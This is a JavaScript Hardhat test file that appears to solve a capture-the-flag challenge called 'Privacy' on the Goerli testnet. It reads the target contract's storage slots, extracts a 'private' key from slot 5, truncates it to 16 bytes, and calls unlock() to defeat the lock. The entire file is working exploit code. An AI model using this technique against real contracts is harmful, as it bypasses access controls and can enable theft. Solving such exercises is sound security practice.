const { expect } = require("chai");
const { ethers } = require("hardhat");
const { api_key, } = require('../secrets.json');

describe("PrivacyHack", function () {
    
    beforeEach(async function () {
    });
    
    it("Attack", async function () {
        const target_address = "0x5b03f4E5d3ed1EE60563D6dd81d9282B35c31c8b";     
        const provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);

        var data;
        console.log("Logging stored memory on the contract");
        for (let i = 0; i < 6; i++) {
            data = await provider.getStorageAt(target_address, i);
            console.log(i, data);
        }
        let dataHacked32bytes = await provider.getStorageAt(target_address, 5);
        console.log("hacked password (32bytes) value ", dataHacked32bytes);
        console.log("hacked password (32bytes) length ", ethers.utils.hexDataLength(dataHacked32bytes));
        let dataHacked16bytes = dataHacked32bytes.toString().substring(0, dataHacked32bytes.toString().length / 2 +1 );
        console.log("hacked password (16bytes) value ", dataHacked16bytes);
        console.log("hacked password (16bytes) length ", ethers.utils.hexDataLength(dataHacked16bytes));

        let contract = await ethers.getContractAt("Privacy", target_address);
        let locked = await contract.locked();
        console.log(" Lock status before unlocking: ",locked);
        expect(locked).to.be.true;
        
        console.log("Unlocking the contract...");
        const unlockTx = await contract.unlock(dataHacked16bytes);
        await unlockTx.wait(1);
        
        locked = await contract.locked();
        console.log("Lock status after unlocking: ", locked);
        expect(locked).to.be.false;
  });

  afterEach(async function() {
  });

});
